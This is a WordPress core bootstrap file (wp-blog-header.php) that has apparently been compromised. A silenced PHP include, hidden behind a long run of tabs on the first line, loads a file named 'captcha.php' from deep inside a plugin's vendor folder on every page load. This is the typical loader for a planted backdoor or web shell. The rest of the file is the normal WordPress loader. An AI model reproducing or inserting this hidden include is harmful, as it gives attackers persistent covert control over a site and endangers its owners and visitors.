<?php																																										@include_once('/var/www/html/TEST/wp-content/plugins/jupiterx-core/includes/extensions/raven/includes/modules/forms/classes/social-login-handler/vendors/abraham/twitteroauth/src/Util/captcha.php');

/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
